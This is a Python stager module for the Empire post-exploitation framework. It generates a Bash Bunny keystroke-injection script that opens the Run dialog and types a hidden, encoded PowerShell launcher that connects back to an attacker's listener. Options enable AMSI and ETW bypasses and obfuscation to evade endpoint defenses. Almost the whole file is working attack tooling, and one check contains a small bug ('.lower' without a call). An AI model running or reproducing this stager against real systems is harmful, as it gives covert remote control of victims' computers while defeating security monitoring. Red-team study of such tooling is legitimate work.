from __future__ import print_function
from builtins import object
from lib.common import helpers

class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BunnyLauncher',

            'Author': ['@kisasondi','@harmj0y'],

            'Description': ('Generates a bunny script that runs a one-liner stage0 launcher for Empire.'),

            'Comments': [
                'This stager is modification of the ducky stager by @harmj0y,',
                'Current other language (keyboard layout) support is trough DuckyInstall from https://github.com/hak5/bashbunny-payloads'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False'
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'AMSIBypass': {
                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'True'
            },
            'AMSIBypass2': {
                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'False'
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'Keyboard' : {
                'Description'   :   'Use a different layout then EN. Add a Q SET_LANGUAGE stanza for various keymaps, try DE, HR...',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Interpreter' : {
                'Description'   :   'Interpreter for code (Defaults to powershell, since a lot of places block cmd.exe)',
                'Required'      :   False,
                'Value'         :   'powershell'
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output duckyscript to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ETWBypass': {
                'Description': 'Include tandasat\'s ETW bypass in the stager code.',
                'Required': False,
                'Value': 'False'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        # default booleans to false
        obfuscateScript = False
        AMSIBypassBool = False
        AMSIBypass2Bool = False
        ETWBypassBool = False

        # extract all of our options
        language = self.options['Language']['Value']
        interpreter = self.options['Interpreter']['Value']
        keyboard = self.options['Keyboard']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        if self.options['ETWBypass']['Value'].lower() == "true":
            ETWBypassBool = True
        if self.options['AMSIBypass']['Value'].lower() == "true":
            AMSIBypassBool = True
        if self.options['AMSIBypass2']['Value'].lower() == "true":
            AMSIBypass2Bool = True
        if self.options['Obfuscate']['Value'].lower == "true":
            obfuscateScript = True
        obfuscateCommand = self.options['ObfuscateCommand']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True,
                                                           obfuscate=obfuscateScript,
                                                           obfuscationCommand=obfuscateCommand, userAgent=userAgent,
                                                           proxy=proxy, proxyCreds=proxyCreds,
                                                           stagerRetries=stagerRetries, AMSIBypass=AMSIBypassBool,
                                                           AMSIBypass2=AMSIBypass2Bool, ETWBypass=ETWBypassBool)
        

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            enc = launcher.split(" ")[-1]
            bunnyCode =  "#!/bin/bash\n"
            bunnyCode += "LED R G\n"
            bunnyCode += "source bunny_helpers.sh\n"
            bunnyCode += "ATTACKMODE HID\n"
            if keyboard != '': 
                bunnyCode += "Q SET_LANGUAGE " + keyboard + "\n"
            bunnyCode += "Q DELAY 500\n"
            bunnyCode += "Q GUI r\n"
            bunnyCode += "Q STRING " + interpreter + "\n"
            bunnyCode += "Q ENTER\n"
            bunnyCode += "Q DELAY 500\n"
            bunnyCode += "Q STRING powershell -W Hidden -nop -noni -enc "+enc+"\n"
            bunnyCode += "Q ENTER\n"
            bunnyCode += "LED R G B 200\n"
            return bunnyCode
